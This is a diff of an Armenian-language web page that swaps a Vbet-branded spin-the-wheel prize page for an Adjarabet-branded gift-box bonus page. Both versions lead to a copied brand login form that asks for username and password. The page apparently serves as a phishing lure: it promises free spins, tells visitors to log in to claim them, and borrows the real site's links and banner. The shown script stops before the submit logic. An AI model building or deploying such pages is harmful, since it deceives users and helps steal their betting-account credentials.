@@ -1,954 +1,769 @@
 <!DOCTYPE html>
 <html lang="hy">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
-<title>Վբեթ ✌️| Սպորտային Խաղադրույքներ, Օնլայն Խաղեր, Կազինո և Պոկեր</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Adjarabet - Բացիր Բոնուսը</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
 
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    /* ========== GIFTS PAGE STYLES ========== */
+    .gifts-page {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 30% 20%, #14181f, #07090c);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 200;
+      transition: all 0.4s ease;
+    }
+    .gifts-container {
+      max-width: 550px;
+      width: 90%;
+      margin: 0 auto;
+      text-align: center;
+      padding: 30px 20px;
+    }
+    .gifts-logo {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px;
+    }
+    .gifts-title {
+      font-size: 28px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #FFD966, #FFA500);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 12px;
+    }
+    .gifts-subtitle {
+      color: #9aaebf;
+      font-size: 14px;
+      margin-bottom: 40px;
+    }
+    .gifts-grid {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+      margin: 20px 0;
+    }
+    .gift-item {
+      background: linear-gradient(145deg, #1e2a32, #12181f);
+      border-radius: 28px;
+      padding: 20px 16px;
+      cursor: pointer;
+      width: 100px;
+      text-align: center;
+      transition: all 0.3s cubic-bezier(0.34, 1.2, 0.64, 1);
+      border: 1px solid rgba(255, 200, 50, 0.4);
+      animation: floatGift 2.5s ease-in-out infinite;
+      animation-delay: calc(var(--i, 0) * 0.12s);
+    }
+    @keyframes floatGift {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-12px); }
+    }
+    .gift-item:hover {
+      transform: scale(1.08) translateY(-5px);
+      border-color: #ffcd7e;
+      background: #2e4457;
+    }
+    .gift-icon {
+      font-size: 60px;
+      filter: drop-shadow(0 8px 12px rgba(0,0,0,0.5));
+    }
+    @media (max-width: 480px) {
+      .gift-item {
+        width: 80px;
+        padding: 15px 10px;
+      }
+      .gift-icon {
+        font-size: 48px;
+      }
+      .gifts-grid {
+        gap: 12px;
+      }
+    }
+    @media (max-width: 380px) {
+      .gift-item {
+        width: 70px;
+        padding: 12px 8px;
+      }
+      .gift-icon {
+        font-size: 42px;
+      }
+    }
 
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    -webkit-tap-highlight-color: transparent;
-}
+    /* ========== BONUS MODAL (ANIMATED) ========== */
+    .bonus-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.92);
+      backdrop-filter: blur(12px);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0.3s, opacity 0.3s;
+    }
+    .bonus-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+    .bonus-popup {
+      background: linear-gradient(145deg, #1e2a32, #0f1419);
+      border-radius: 60px;
+      max-width: 340px;
+      width: 85%;
+      padding: 32px 24px 40px;
+      text-align: center;
+      transform: scale(0.7) rotate(-5deg);
+      transition: transform 0.5s cubic-bezier(0.34, 1.2, 0.64, 1);
+      border: 1px solid rgba(255, 215, 0, 0.6);
+      box-shadow: 0 30px 50px rgba(0,0,0,0.5);
+    }
+    .bonus-overlay.active .bonus-popup {
+      transform: scale(1) rotate(0deg);
+    }
+    .bonus-emoji {
+      font-size: 75px;
+      animation: bounceAnim 0.6s ease infinite alternate;
+    }
+    @keyframes bounceAnim {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-15px); }
+    }
+    .bonus-title {
+      font-size: 30px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #FFD966, #FFA500);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin: 12px 0 8px;
+    }
+    .bonus-amount {
+      font-size: 42px;
+      font-weight: 900;
+      color: #FFD966;
+      text-shadow: 0 0 12px #ff9900;
+      margin: 10px 0;
+    }
+    .bonus-message {
+      font-size: 15px;
+      color: #cbd5e6;
+      margin: 16px 0 24px;
+      line-height: 1.4;
+    }
+    .bonus-button {
+      background: linear-gradient(105deg, #2a8c4e, #1f6e3e);
+      border: none;
+      border-radius: 60px;
+      padding: 14px;
+      font-size: 18px;
+      font-weight: 700;
+      color: white;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .bonus-button:hover {
+      transform: scale(1.02);
+      background: linear-gradient(105deg, #34a75f, #258a4a);
+    }
 
-body {
-    background: linear-gradient(135deg, #0a0a2a, #1a0a3a);
-    font-family: 'Montserrat', sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    margin: 0;
-    padding: 20px;
-}
+    /* ========== LOGIN PAGE (ORIGINAL STYLE) ========== */
+    body.login-body {
+      background-color: #0f1215;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      color: #ffffff;
+      height: 100vh;
+      overflow: hidden;
+      margin: 0;
+      padding: 0;
+    }
+    .mobile-login-container {
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .banner-section {
+      position: relative;
+      flex-shrink: 0;
+    }
+    .banner-image {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+    .banner-link {
+      display: block;
+      cursor: pointer;
+    }
+    .header-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      z-index: 10;
+    }
+    .logo-icon {
+      width: 40px;
+      height: 40px;
+      cursor: pointer;
+    }
+    .logo-icon svg {
+      width: 100%;
+      height: 100%;
+    }
+    .close-button {
+      background: rgba(36, 42, 47, 0.9);
+      border: none;
+      border-radius: 999px;
+      width: 40px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: #9ca3af;
+    }
+    .login-card {
+      background-color: #1a1f24;
+      border-radius: 24px 24px 0 0;
+      flex: 1;
+      margin-top: auto;
+      padding: 20px 16px 32px;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+      box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.3);
+    }
+    .title {
+      font-size: 20px;
+      font-weight: 600;
+    }
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .input-wrapper {
+      background-color: #23282e;
+      border: 1px solid #2f353c;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      padding: 4px 12px;
+    }
+    .input-wrapper:focus-within {
+      border-color: #4c9aff;
+    }
+    .input-icon {
+      width: 20px;
+      height: 20px;
+      margin-right: 8px;
+      color: #7e8a93;
+      flex-shrink: 0;
+    }
+    .input-field-container {
+      flex: 1;
+      position: relative;
+      height: 56px;
+      display: flex;
+      align-items: center;
+    }
+    .floating-label {
+      position: absolute;
+      left: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 14px;
+      color: #7e8a93;
+      pointer-events: none;
+      transition: 0.2s ease;
+    }
+    .input-field {
+      width: 100%;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: white;
+      font-size: 16px;
+      padding-top: 18px;
+      padding-bottom: 4px;
+    }
+    .input-field:focus + .floating-label,
+    .input-field:not(:placeholder-shown) + .floating-label {
+      top: 8px;
+      transform: translateY(0);
+      font-size: 11px;
+      color: #9aa6b0;
+    }
+    .otp-button {
+      background: #2c353d;
+      border: none;
+      border-radius: 40px;
+      padding: 8px 16px;
+      font-size: 13px;
+      color: #cbd5e1;
+      white-space: nowrap;
+      cursor: pointer;
+      height: 40px;
+    }
+    .otp-button:hover {
+      background: #3a444e;
+      color: white;
+    }
+    .password-toggle {
+      background: none;
+      border: none;
+      color: #7e8a93;
+      cursor: pointer;
+      padding: 8px;
+    }
+    .recovery-links {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 4px;
+    }
+    .recovery-link {
+      background: none;
+      border: none;
+      color: #9ca3af;
+      font-size: 12px;
+      border-bottom: 1px solid transparent;
+      padding: 4px 0;
+      cursor: pointer;
+    }
+    .recovery-link:hover {
+      color: white;
+      border-bottom-color: #4c9aff;
+    }
+    .login-btn {
+      background: linear-gradient(135deg, #3a9b5e 0%, #2d8a4e 100%);
+      border: none;
+      border-radius: 40px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 600;
+      color: white;
+      width: 100%;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .login-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 8px 0;
+    }
+    .divider-line {
+      flex: 1;
+      height: 1px;
+      background: linear-gradient(90deg, #181c20, #373f45);
+    }
+    .divider-text {
+      font-size: 12px;
+      color: #8e9aa4;
+    }
+    .register-btn {
+      background: #2c353d;
+      border: none;
+      border-radius: 40px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 600;
+      color: #e5e9f0;
+      width: 100%;
+      cursor: pointer;
+      text-align: center;
+      display: block;
+      text-decoration: none;
+    }
+    .register-btn:hover {
+      background: #3b464f;
+      color: white;
+    }
+    .spinner {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 0.6s linear infinite;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .btn-text {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .toast-message {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #2c353d;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 40px;
+      font-size: 14px;
+      z-index: 1000;
+      opacity: 0;
+      transition: opacity 0.3s;
+      pointer-events: none;
+    }
+    .toast-message.show {
+      opacity: 1;
+    }
 
-#wheelPage {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    width: 100%;
-    animation: fadeIn 0.5s ease;
-}
-
-@keyframes fadeIn {
-    from { opacity: 0; transform: scale(0.95); }
-    to { opacity: 1; transform: scale(1); }
-}
-
-.wheel-container-box {
-    width: 480px;
-    max-width: 100%;
-    background: linear-gradient(145deg, rgba(30, 10, 60, 0.95), rgba(15, 5, 35, 0.98));
-    backdrop-filter: blur(12px);
-    border-radius: 56px;
-    padding: 28px 22px 38px;
-    text-align: center;
-    box-shadow: 0 30px 50px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.08);
-    border: 1px solid rgba(156, 39, 176, 0.3);
-}
-
-.logo {
-    font-size: 52px;
-    font-weight: 900;
-    background: linear-gradient(135deg, #9c27b0, #e91e63, #ff6b00);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    margin-bottom: 5px;
-    letter-spacing: -1px;
-}
-.logo span { font-size: 24px; font-weight: 700; }
-
-.title {
-    color: rgba(255,255,255,0.9);
-    font-size: 16px;
-    font-weight: 500;
-    margin-bottom: 25px;
-    letter-spacing: 1px;
-    text-transform: uppercase;
-    background: rgba(156, 39, 176, 0.3);
-    display: inline-block;
-    padding: 6px 18px;
-    border-radius: 40px;
-}
-
-.wheel-container {
-    position: relative;
-    width: 300px;
-    height: 300px;
-    margin: 0 auto 25px;
-}
-
-canvas {
-    width: 100% !important;
-    height: 100% !important;
-    border-radius: 50%;
-    box-shadow: 0 15px 35px rgba(0,0,0,0.5), 0 0 0 8px rgba(156, 39, 176, 0.3), 0 0 0 15px rgba(255,255,255,0.05);
-}
-
-.pointer {
-    position: absolute;
-    top: -28px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 0;
-    height: 0;
-    border-left: 22px solid transparent;
-    border-right: 22px solid transparent;
-    border-top: 50px solid #ffd700;
-    filter: drop-shadow(0 6px 10px rgba(0,0,0,0.4));
-    z-index: 10;
-}
-.pointer::after {
-    content: "▼";
-    position: absolute;
-    top: -58px;
-    left: -14px;
-    font-size: 28px;
-    color: #ffd700;
-    text-shadow: 0 2px 5px rgba(0,0,0,0.5);
-}
-.pointer::before {
-    content: "";
-    position: absolute;
-    bottom: -12px;
-    left: -6px;
-    width: 12px;
-    height: 12px;
-    background: #ffd700;
-    border-radius: 50%;
-}
-
-.spin-btn {
-    background: linear-gradient(135deg, #9c27b0, #e91e63);
-    border: none;
-    width: 180px;
-    padding: 16px 0;
-    border-radius: 60px;
-    color: white;
-    font-size: 22px;
-    font-weight: 800;
-    cursor: pointer;
-    margin: 10px auto;
-    transition: 0.2s;
-    box-shadow: 0 8px 20px rgba(0,0,0,0.4);
-}
-.spin-btn:hover { transform: scale(1.03); background: linear-gradient(135deg, #ab47bc, #f06292); }
-.spin-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-
-.result-box {
-    background: rgba(0,0,0,0.55);
-    border-radius: 50px;
-    padding: 18px 15px;
-    margin-top: 20px;
-    backdrop-filter: blur(8px);
-    border: 1px solid rgba(156, 39, 176, 0.3);
-}
-
-.prize-message {
-    font-size: 22px;
-    font-weight: 800;
-    background: linear-gradient(135deg, #ffd700, #ffaa00);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    margin-bottom: 12px;
-}
-
-.continue-btn {
-    background: linear-gradient(135deg, #2ecc71, #27ae60);
-    border: none;
-    width: 100%;
-    padding: 16px;
-    border-radius: 50px;
-    color: white;
-    font-size: 18px;
-    font-weight: 700;
-    cursor: pointer;
-    margin-top: 12px;
-    transition: 0.2s;
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-}
-.continue-btn:hover { transform: scale(1.01); background: linear-gradient(135deg, #3de07a, #2ecc71); box-shadow: 0 0 15px rgba(46, 204, 113, 0.5); }
-
-.hidden { display: none; }
-
-.winner-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: radial-gradient(circle, rgba(156,39,176,0.4), rgba(0,0,0,0.8));
-    z-index: 9998;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    animation: fadeOut 2s forwards;
-    pointer-events: none;
-}
-@keyframes fadeOut { 0% { opacity: 1; } 70% { opacity: 1; } 100% { opacity: 0; visibility: hidden; } }
-
-.winner-text {
-    font-size: 48px;
-    font-weight: 900;
-    animation: winnerZoom 0.8s ease-out;
-    text-align: center;
-    background: linear-gradient(135deg, #ffd700, #ff8c00);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-}
-@keyframes winnerZoom { 0% { transform: scale(0.3); opacity: 0; } 50% { transform: scale(1.2); } 100% { transform: scale(1); opacity: 1; } }
-
-.sparkle {
-    position: fixed;
-    pointer-events: none;
-    width: 10px;
-    height: 10px;
-    background: radial-gradient(circle, #ffd700, #ff8c00);
-    border-radius: 50%;
-    animation: sparkleAnim 0.8s ease-out forwards;
-    z-index: 9999;
-}
-@keyframes sparkleAnim { 0% { opacity: 1; transform: scale(1); } 100% { opacity: 0; transform: scale(3); } }
-
-.confetti {
-    position: fixed;
-    width: 12px;
-    height: 18px;
-    top: -20px;
-    animation: confettiFall 3s linear forwards;
-    z-index: 9997;
-}
-@keyframes confettiFall { 0% { transform: translateY(0) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(720deg); opacity: 0; } }
-
-#loginPage {
-    display: none;
-    width: 100%;
-    justify-content: center;
-    align-items: center;
-    animation: slideUp 0.5s ease;
-}
-@keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-
-.mobile-box {
-    width: 407px;
-    max-width: 100%;
-    min-height: 700px;
-    background: #020d2c;
-    border-left: 4px solid #9c27b0;
-    border-right: 4px solid #9c27b0;
-    border-radius: 28px;
-    box-shadow: 0 25px 45px rgba(0,0,0,0.5);
-}
-.topbar {
-    height: 60px;
-    padding: 12px 14px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    background: linear-gradient(135deg, #0a0a2a, #1a0a3a);
-    border-bottom: 1px solid rgba(156, 39, 176, 0.3);
-}
-.logo-wrap { display: flex; align-items: center; gap: 10px; }
-.logo-login {
-    background: linear-gradient(135deg, #9c27b0, #e91e63);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    font-size: 38px;
-    font-weight: 700;
-    letter-spacing: -2px;
-}
-.logo-login span { font-size: 18px; vertical-align: middle; }
-.real-logo {
-    width: 28px;
-    height: 28px;
-    border-radius: 50%;
-    background: url('https://upload.wikimedia.org/wikipedia/en/5/56/Real_Madrid_CF.svg') center/cover;
-    background-size: contain;
-    background-repeat: no-repeat;
-}
-.right-side { display: flex; align-items: center; gap: 18px; }
-.signup-btn {
-    background: linear-gradient(135deg, #9c27b0, #e91e63);
-    color: #fff;
-    border: none;
-    padding: 9px 16px;
-    border-radius: 5px;
-    font-size: 13px;
-    font-weight: 600;
-    cursor: pointer;
-}
-.signup-btn:hover { transform: scale(1.02); box-shadow: 0 0 10px rgba(156, 39, 176, 0.5); }
-.close { color: #b4b9c7; font-size: 26px; cursor: pointer; }
-.close:hover { color: #9c27b0; }
-.content { padding: 24px 18px 32px; }
-.small-title { color: #8d95ab; font-size: 13px; margin-bottom: 8px; letter-spacing: 0.3px; }
-.big-title { color: #ffffff; font-size: 19px; font-weight: 600; line-height: 1.35; margin-bottom: 22px; }
-.input-username { margin-bottom: 24px; }
-.input {
-    width: 100%;
-    height: 52px;
-    background: #28334f;
-    border: none;
-    border-radius: 8px;
-    padding: 0 14px;
-    color: #fff;
-    font-size: 14px;
-    outline: none;
-    transition: all 0.2s;
-}
-.input:focus { background: #1f2a44; border: 1px solid #9c27b0; }
-.input::placeholder { color: #9ba2b7; font-weight: 400; }
-.input-group { position: relative; width: 100%; margin-bottom: 12px; }
-.password-toggle-btn {
-    position: absolute;
-    right: 14px;
-    top: 50%;
-    transform: translateY(-50%);
-    background: transparent;
-    border: none;
-    cursor: pointer;
-    padding: 8px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-.password-toggle-btn:hover { background: rgba(156, 39, 176, 0.2); }
-.eye-icon { width: 22px; height: 22px; display: block; stroke: #9ba2b7; stroke-width: 1.8; fill: none; }
-.password-toggle-btn:hover .eye-icon { stroke: #9c27b0; }
-.login-btn {
-    width: 100%;
-    height: 48px;
-    background: linear-gradient(135deg, #2ecc71, #27ae60);
-    border: none;
-    border-radius: 40px;
-    color: white;
-    font-size: 18px;
-    font-weight: 600;
-    cursor: pointer;
-    margin-top: 20px;
-    transition: 0.2s;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-}
-.login-btn:hover { transform: scale(1.01); box-shadow: 0 0 15px rgba(46, 204, 113, 0.5); }
-.login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-.toast-message {
-    position: fixed;
-    bottom: 30px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: #1e1e3a;
-    color: white;
-    padding: 12px 24px;
-    border-radius: 40px;
-    font-size: 14px;
-    z-index: 2000;
-    opacity: 0;
-    transition: opacity 0.3s;
-    pointer-events: none;
-    white-space: nowrap;
-    border: 1px solid #9c27b0;
-}
-.toast-message.show { opacity: 1; }
-.spinner {
-    display: inline-block;
-    width: 18px;
-    height: 18px;
-    border: 2px solid rgba(255,255,255,0.3);
-    border-radius: 50%;
-    border-top-color: white;
-    animation: spin 0.6s linear infinite;
-    margin-left: 8px;
-    vertical-align: middle;
-}
-@keyframes spin { to { transform: rotate(360deg); } }
-.btn-text { display: inline-flex; align-items: center; justify-content: center; gap: 6px; }
-
-@media (max-width: 480px) {
-    .wheel-container-box { padding: 20px 16px 28px; }
-    .wheel-container { width: 260px; height: 260px; }
-    .prize-message { font-size: 18px; }
-    .continue-btn { font-size: 16px; padding: 12px; }
-    .spin-btn { width: 150px; font-size: 18px; padding: 12px 0; }
-    .mobile-box { width: 100%; border-left: 2px solid #9c27b0; border-right: 2px solid #9c27b0; border-radius: 24px; }
-    .content { padding: 20px 16px 28px; }
-    .big-title { font-size: 18px; }
-    .winner-text { font-size: 32px; }
-}
-</style>
+    /* DESKTOP ADAPTATION FOR LOGIN */
+    @media (min-width: 768px) {
+      body.login-body {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: radial-gradient(circle at 30% 10%, #1a1f2a, #05070a);
+        height: 100vh;
+        overflow: auto;
+      }
+      .mobile-login-container {
+        max-width: 480px;
+        width: 100%;
+        height: auto;
+        border-radius: 40px;
+        overflow: hidden;
+        box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5);
+      }
+      .login-card {
+        border-radius: 0 0 24px 24px;
+      }
+      body.login-body {
+        padding: 20px;
+      }
+    }
+  </style>
 </head>
-<body>
-
-<div id="wheelPage">
-    <div class="wheel-container-box">
-        <div class="logo">v<span>bet</span></div>
-        <div class="title">🎡 ՀԱՋՈՂՈՒԹՅԱՆ ԱՆԻՎ 🎡</div>
-        <div class="wheel-container">
-            <canvas id="wheelCanvas" width="600" height="600"></canvas>
-            <div class="pointer"></div>
-        </div>
-        <button class="spin-btn" id="spinBtn">🎰 ՊՏՏԵԼ</button>
-        <div class="result-box">
-            <div class="prize-message" id="prizeMessage">✨ Պտտեք անիվը և շահեք ✨</div>
-        </div>
+<body id="mainBody">
+  <!-- GIFTS PAGE -->
+  <div id="giftsPage" class="gifts-page">
+    <div class="gifts-container">
+      <div class="gifts-logo">
+      </div>
+      <div class="gifts-title">🎁 Բացիր Բոնուսը 🎁</div>
+      <div class="gifts-subtitle">Ընտրիր տուփերից մեկը և ստացիր անակնկալ նվեր</div>
+      <div class="gifts-grid" id="giftsGrid"></div>
     </div>
-</div>
+  </div>
 
-<div id="loginPage">
-    <div class="mobile-box">
-        <div class="topbar">
-            <div class="logo-wrap">
-                <div class="logo-login">v<span>bet</span></div>
-                <div class="real-logo"></div>
-            </div>
-            <div class="right-side">
-                <button class="signup-btn" id="signupBtn">ԳՐԱՆՑՈՒՄ</button>
-                <div class="close" id="closeBtn">×</div>
-            </div>
-        </div>
-        <div class="content">
-            <div class="small-title">Արդեն ունեք հաշիվ</div>
-            <div class="big-title">Մուտք գործեք, մենք սպասում ենք ձեզ</div>
-            <input class="input input-username" type="text" id="loginUsername" placeholder="Էլ. փոստ / Մուտքանուն *" autocomplete="username">
-            <div class="input-group">
-                <input class="input" type="password" id="loginPassword" placeholder="Գաղտնաբառ *" autocomplete="current-password">
-                <button type="button" class="password-toggle-btn" id="togglePasswordEye">
-                    <svg class="eye-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-                        <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.8"/>
-                        <line id="eyeSlashLine" x1="3" y1="3" x2="21" y2="21" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-                    </svg>
-                </button>
-            </div>
-            <button class="login-btn" id="loginBtn"><span class="btn-text">Մուտք</span></button>
-        </div>
+  <!-- BONUS MODAL -->
+  <div id="bonusModal" class="bonus-overlay">
+    <div class="bonus-popup">
+      <div class="bonus-emoji">🎉🎁✨</div>
+      <div class="bonus-title">Շնորհավոր!</div>
+      <div class="bonus-amount">50 x 100 ֏ ՖՐԻՍՓԻՆ</div>
+      <div class="bonus-message">Դուք ստացաք 50 հատ 100 դրամանոց ֆրիսփին!<br>Բոնուսը ստանալու համար մուտք գործեք ձեր հաշիվ</div>
+      <button class="bonus-button" id="closeBonusBtn">Մուտք գործել</button>
     </div>
-</div>
+  </div>
 
-<div id="toastMsg" class="toast-message"></div>
+  <!-- LOGIN PAGE (HIDDEN INITIALLY) -->
+  <div id="loginPage" style="display: none;">
+    <div class="mobile-login-container">
+      <div class="banner-section">
+        <a class="banner-link" href="https://www.adjarabet.am/hy">
+          <img class="banner-image" src="https://staticfiles.adjarabet.am/static.am/desktop/cms-nova/media/68880/868b6b1371a43ace557d5930b7a16311.webp" alt="Promotion banner">
+        </a>
+        <div class="header-overlay">
+          <div class="logo-icon">
+            <svg viewBox="0 0 40 40" fill="none">
+              <path d="M20 5L33 12L20 19L7 12L20 5Z" fill="#2DD179"/>
+              <path d="M20 19L33 12V26L20 33V19Z" fill="#1F9A55"/>
+              <path d="M20 19L7 12V26L20 33V19Z" fill="#1C8148"/>
+              <circle cx="20" cy="20" r="3" fill="white"/>
+            </svg>
+          </div>
+          <button class="close-button" aria-label="Close">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M18 6L6 18M6 6l12 12"/>
+            </svg>
+          </button>
+        </div>
+      </div>
 
-<script>
-    
+      <div class="login-card">
+        <div class="title">Մուտք</div>
+
+        <form class="form-group" id="loginForm">
+          <div class="input-wrapper">
+            <div class="input-icon">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                <circle cx="12" cy="7" r="4" />
+              </svg>
+            </div>
+            <div class="input-field-container">
+              <input type="text" id="username" class="input-field" placeholder=" " autocomplete="username">
+              <label class="floating-label">Անուն</label>
+            </div>
+          </div>
+
+          <div class="input-wrapper">
+            <div class="input-icon">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+              </svg>
+            </div>
+            <div class="input-field-container">
+              <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password">
+              <label class="floating-label">գաղտնաբառը</label>
+            </div>
+            <button type="button" class="password-toggle" id="togglePassword">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                <circle cx="12" cy="12" r="3" />
+              </svg>
+            </button>
+          </div>
+
+          <div class="recovery-links">
+            <button type="button" class="recovery-link" id="restoreUsername">Մուտքանվան վերականգնում</button>
+            <button type="button" class="recovery-link" id="restorePass">գաղտնաբառի վերականգնում</button>
+          </div>
+
+          <button type="submit" class="login-btn" id="loginBtn">
+            <span class="btn-text">Մուտք</span>
+          </button>
+        </form>
+
+        <div class="divider">
+          <div class="divider-line"></div>
+          <span class="divider-text">Հաշիվ չունեք:</span>
+          <div class="divider-line" style="transform: rotate(180deg);"></div>
+        </div>
+
+        <a href="https://www.adjarabet.am/hy/SignupAm/First" class="register-btn" id="registerBtn">Գրանցում</a>
+      </div>
+    </div>
+  </div>
+
+  <div id="toastMsg" class="toast-message"></div>
+
+  <script>
 (function() {
-    // ========================
-    //  CONFIGURATION
-    // ========================
-    const STORAGE_KEY = 'vbet_wheel_state';
+    // ========== LOGIN PAGE LOGIC (ORIGINAL) ==========
+    const REAL_LOGIN_URL = 'https://www.adjarabet.am/hy';
+    const REAL_REGISTER_URL = 'https://www.adjarabet.am/hy/SignupAm/First';
     
-    const SEGMENTS = [
-        { name: "5 FREE SPINS", value: 5, color: "#6a1b9a" },
-        { name: "10 FREE SPINS", value: 10, color: "#8e24aa" },
-        { name: "20 FREE SPINS", value: 20, color: "#ab47bc" },
-        { name: "50 FREE SPINS", value: 50, color: "#ba68c8" },
-        { name: "100 FREE SPINS", value: 100, color: "#ce93d8" },
-        { name: "15 FREE SPINS", value: 15, color: "#9c27b0" },
-        { name: "30 FREE SPINS", value: 30, color: "#7b1fa2" },
-        { name: "7 FREE SPINS", value: 7, color: "#4a148c" }
-    ];
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const loginForm = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const toggleBtn = document.getElementById('togglePassword');
+    const otpBtn = document.getElementById('otpBtn');
+    const restoreUser = document.getElementById('restoreUsername');
+    const restorePass = document.getElementById('restorePass');
+    const registerBtn = document.getElementById('registerBtn');
+    const closeBtn = document.querySelector('.close-button');
+    const toastEl = document.getElementById('toastMsg');
     
-    // Audio setup
-    let audioCtx = null;
+    function showMessage(text, isError) {
+      if (!toastEl) return;
+      toastEl.textContent = text;
+      toastEl.style.backgroundColor = isError ? '#b91c1c' : '#2c353d';
+      toastEl.classList.add('show');
+      setTimeout(() => toastEl.classList.remove('show'), 3000);
+    }
     
-    function initAudio() { 
-        if (!audioCtx) {
-            try {
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            } catch(e) { console.log('Audio not supported'); }
+    function updateLabel(input) {
+      const label = input.nextElementSibling;
+      if (label && label.classList.contains('floating-label')) {
+        if (input.value.trim() !== '') {
+          label.style.top = '8px';
+          label.style.fontSize = '11px';
+          label.style.transform = 'translateY(0)';
